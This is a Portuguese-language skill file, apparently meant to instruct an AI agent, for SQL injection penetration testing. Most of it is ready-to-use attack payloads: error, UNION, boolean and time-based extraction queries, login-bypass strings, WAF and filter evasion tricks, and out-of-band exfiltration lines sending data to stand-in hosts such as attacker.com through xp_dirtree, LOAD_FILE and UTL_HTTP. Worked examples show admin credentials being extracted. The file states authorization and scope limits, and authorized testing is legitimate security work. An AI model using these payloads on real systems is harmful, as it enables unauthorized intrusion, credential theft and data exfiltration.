---
name: SQL Injection Testing
description: Esta skill deve ser usada quando o usuário solicita "testar vulnerabilidades de SQL injection", "realizar ataques SQLi", "contornar autenticação usando SQL injection", "extrair informações de banco de dados por injeção", "detectar falhas de SQL injection" ou "explorar vulnerabilidades em consultas de banco de dados". Fornece técnicas abrangentes para identificar, explorar e compreender vetores de ataque de SQL injection em diferentes sistemas de banco de dados.
metadata:
  author: zebbern
  version: "1.1"
---

# SQL Injection Testing

## Propósito

Executar avaliações abrangentes de vulnerabilidade de SQL injection em aplicações web para identificar falhas de segurança em banco de dados, demonstrar técnicas de exploração e validar mecanismos de sanitização de entrada. Esta skill permite a detecção sistemática e exploração de vulnerabilidades de SQL injection em vetores de ataque in-band, blind e out-of-band para avaliar a postura de segurança da aplicação.

## Entradas / Pré-requisitos

### Acesso Obrigatório
- URL da aplicação web alvo com parâmetros injetáveis
- Burp Suite ou ferramenta proxy equivalente para manipulação de requisições
- Instalação de SQLMap para exploração automatizada
- Navegador com ferramentas de desenvolvedor habilitadas

### Requisitos Técnicos
- Compreensão da sintaxe de consultas SQL (MySQL, MSSQL, PostgreSQL, Oracle)
- Conhecimento do ciclo de requisição/resposta HTTP
- Familiaridade com schemas e estruturas de banco de dados
- Permissões de escrita para relatórios de teste

### Pré-requisitos Legais
- Autorização escrita para teste de penetração
- Escopo definido incluindo URLs alvo e parâmetros
- Procedimentos de contato de emergência estabelecidos
- Acordos de tratamento de dados em vigor

## Saídas / Entregas

### Saídas Principais
- Relatório de vulnerabilidade de SQL injection com classificações de severidade
- Schemas de banco de dados extraídos e estruturas de tabelas
- Demonstrações de prova de conceito de contorno de autenticação
- Recomendações de remediação com exemplos de código

### Artefatos de Evidência
- Screenshots de injeções bem-sucedidas
- Logs de requisição/resposta HTTP
- Dumps de banco de dados (sanitizados)
- Documentação de payload

## Fluxo de Trabalho Principal

### Fase 1: Detecção e Reconhecimento

#### Identificar Parâmetros Injetáveis
Localizar campos de entrada controlados pelo usuário que interagem com consultas de banco de dados:

```
# Pontos de injeção comuns
- Parâmetros de URL: ?id=1, ?user=admin, ?category=books
- Campos de formulário: username, password, search, comments
- Valores de cookies: session_id, user_preference
- Headers HTTP: User-Agent, Referer, X-Forwarded-For
```

#### Testar Indicadores Básicos de Vulnerabilidade
Inserir caracteres especiais para desencadear respostas de erro:

```sql
-- Teste de aspas simples
'

-- Teste de aspas duplas
"

-- Sequências de comentário
--
#
/**/

-- Ponto-e-vírgula para empilhamento de consultas
;

-- Parênteses
)
```

Monitorar respostas da aplicação para:
- Mensagens de erro de banco de dados revelando estrutura de consulta
- Mudanças inesperadas no comportamento da aplicação
- Erros HTTP 500 Internal Server Error
- Conteúdo modificado ou comprimento de resposta

#### Payloads de Teste de Lógica
Verificar presença de vulnerabilidade baseada em booleano:

```sql
-- Testes de condição verdadeira
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- Testes de condição falsa
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

Comparar respostas entre condições verdadeiras e falsas para confirmar capacidade de injeção.

### Fase 2: Técnicas de Exploração

#### Extração Baseada em UNION
Combinar declarações SELECT controladas pelo atacante com consulta original:

```sql
-- Determinar contagem de colunas
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continuar até erro ocorrer

-- Encontrar colunas exibíveis
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Extrair dados
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Extração Baseada em Erro
Forçar erros de banco de dados que vazem informações:

```sql
-- Extração de versão MSSQL
1' AND 1=CONVERT(int,(SELECT @@version))--

-- Extração MySQL via XPATH
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- Erros de cast PostgreSQL
1' AND 1=CAST((SELECT version()) AS int)--
```

#### Extração Baseada em Booleano Blind
Inferir dados através de mudanças no comportamento da aplicação:

```sql
-- Extração de caracteres
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Respostas condicionais
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### Extração Baseada em Tempo Blind
Usar funções sleep do banco de dados para confirmação:

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### Extração Out-of-Band (OOB)
Exfiltrar dados através de canais externos:

```sql
-- Exfiltração DNS MSSQL
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- Exfiltração DNS MySQL
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Requisição HTTP Oracle
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### Fase 3: Contorno de Autenticação

#### Exploração de Formulário de Login
Elaborar payloads para contornar verificação de credenciais:

```sql
-- Contorno clássico
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Enumeração de nome de usuário
admin' AND '1'='1
admin' AND '1'='2
```

Exemplo de transformação de consulta:
```sql
-- Consulta original
SELECT * FROM users WHERE username='input' AND password='input'

-- Injetado (username: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Verificação de senha contornada via comentário
```

### Fase 4: Técnicas de Contorno de Filtro

#### Contorno de Codificação de Caracteres
Quando caracteres especiais são bloqueados:

```sql
-- Codificação URL
%27 (aspas simples)
%22 (aspas duplas)
%23 (hash)

-- Codificação URL dupla
%2527 (aspas simples)

-- Alternativas Unicode
U+0027 (apóstrofo)
U+02B9 (modificador de letra prime)

-- Strings hexadecimais (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' em hex
```

#### Contorno de Espaço em Branco
Substituir espaços bloqueados:

```sql
-- Substituição de comentário
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- Espaço em branco alternativo
SELECT%09username%09FROM%09users  -- Caractere Tab
SELECT%0Ausername%0AFROM%0Ausers  -- Quebra de linha
```

#### Contorno de Palavra-chave
Evadir keywords SQL bloqueadas:

```sql
-- Variação de caso
SeLeCt, sElEcT, SELECT

-- Comentários inline
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Dupla escrita (se o filtro remove uma vez)
SELSELECTECT → SELECT
UNUNIONION → UNION

-- Injeção de null byte
%00SELECT
SEL%00ECT
```

## Referência Rápida

### Sequência de Teste de Detecção
```
1. Inserir ' → Verificar erro
2. Inserir " → Verificar erro
3. Tentar: OR 1=1-- → Verificar mudança de comportamento
4. Tentar: AND 1=2-- → Verificar mudança de comportamento
5. Tentar: ' WAITFOR DELAY '0:0:5'-- → Verificar atraso
```

### Fingerprinting de Banco de Dados
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT @@servername

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
SELECT * FROM v$version
```

### Consultas de Information Schema
```sql
-- Enumeração de tabelas MySQL/MSSQL
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Enumeração de colunas
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Equivalente Oracle
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Lista Rápida de Payloads Comuns
| Propósito | Payload |
|---------|---------|
| Teste básico | `'` ou `"` |
| Booleano verdadeiro | `OR 1=1--` |
| Booleano falso | `AND 1=2--` |
| Comentário (MySQL) | `#` ou `-- ` |
| Comentário (MSSQL) | `--` |
| Sonda UNION | `UNION SELECT NULL--` |
| Atraso de tempo | `AND SLEEP(5)--` |
| Contorno de autenticação | `' OR '1'='1` |

## Restrições e Proteções

### Limites Operacionais
- Nunca executar consultas destrutivas (DROP, DELETE, TRUNCATE) sem autorização explícita
- Limitar extração de dados a quantidades de prova de conceito
- Evitar negação de serviço através de consultas intensivas em recursos
- Parar imediatamente ao detectar banco de dados de produção com dados reais de usuários

### Limitações Técnicas
- WAF/IPS pode bloquear payloads comuns exigindo técnicas de evasão
- Consultas parametrizadas previnem injeção padrão
- Algumas injeções blind requerem muitas requisições (preocupações com rate limiting)
- Injeção de segunda ordem requer compreensão do fluxo de dados

### Requisitos Legais e Éticos
- Acordo de escopo escrito deve existir antes de testar
- Documentar todos os dados extraídos e tratar conforme requisitos de proteção de dados
- Relatar vulnerabilidades críticas imediatamente através de canais acordados
- Nunca acessar dados além dos requisitos de escopo

## Exemplos

### Exemplo 1: SQLi de Página de Produto em E-commerce

**Cenário**: Testando página de exibição de produto com parâmetro ID

**Requisição Inicial**:
```
GET /product.php?id=5 HTTP/1.1
```

**Teste de Detecção**:
```
GET /product.php?id=5' HTTP/1.1
Response: Erro MySQL - syntax error near ''' 
```

**Enumeração de Colunas**:
```
GET /product.php?id=5 ORDER BY 4-- HTTP/1.1
Response: Normal
GET /product.php?id=5 ORDER BY 5-- HTTP/1.1
Response: Erro (4 colunas confirmadas)
```

**Extração de Dados**:
```
GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
Response: Exibe credenciais de admin
```

### Exemplo 2: Extração Baseada em Tempo Blind

**Cenário**: Sem saída visível, testando injeção blind

**Confirmar Vulnerabilidade**:
```sql
id=5' AND SLEEP(5)-- 
-- Resposta atrasada por 5 segundos (vulnerabilidade confirmada)
```

**Extrair Comprimento do Nome do Banco de Dados**:
```sql
id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
-- Atraso confirma que nome do banco de dados tem 8 caracteres
```

**Extrair Caracteres**:
```sql
id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
-- Iterar através de caracteres para extrair: 'appstore'
```

### Exemplo 3: Contorno de Login

**Alvo**: Formulário de login de admin

**Consulta de Login Padrão**:
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

**Payload de Injeção**:
```
Username: administrator'--
Password: anything
```

**Consulta Resultante**:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```

**Resultado**: Verificação de senha contornada, autenticado como administrador.

## Solução de Problemas

### Nenhuma Mensagem de Erro Exibida
- Aplicação usa tratamento de erro genérico
- Alternar para técnicas blind (booleano ou baseada em tempo)
- Monitorar diferenças de comprimento de resposta em vez de conteúdo

### Injeção UNION Falha
- Contagem de colunas pode estar incorreta → Testar com ORDER BY
- Tipos de dados podem não corresponder → Usar NULL para todas as colunas primeiro
- Resultados podem não ser exibidos → Encontrar posições de coluna injetáveis

### WAF Bloqueando Requisições
- Usar técnicas de codificação (URL, hex, unicode)
- Inserir comentários inline dentro de keywords
- Tentar sintaxe alternativa para mesmas operações
- Fragmentar payload através de múltiplos parâmetros

### Payload Não Executando
- Verificar sintaxe correta de comentário para tipo de banco de dados
- Confirmar se aplicação usa consultas parametrizadas
- Confirmar que entrada atinge consulta SQL (não filtrada no cliente)
- Testar diferentes pontos de injeção (headers, cookies)

### Injeção Baseada em Tempo Inconsistente
- Latência de rede pode causar falsos positivos
- Usar atrasos maiores (10+ segundos) para clareza
- Executar múltiplos testes para confirmar padrão
- Considerar efeitos de cache no lado do servidor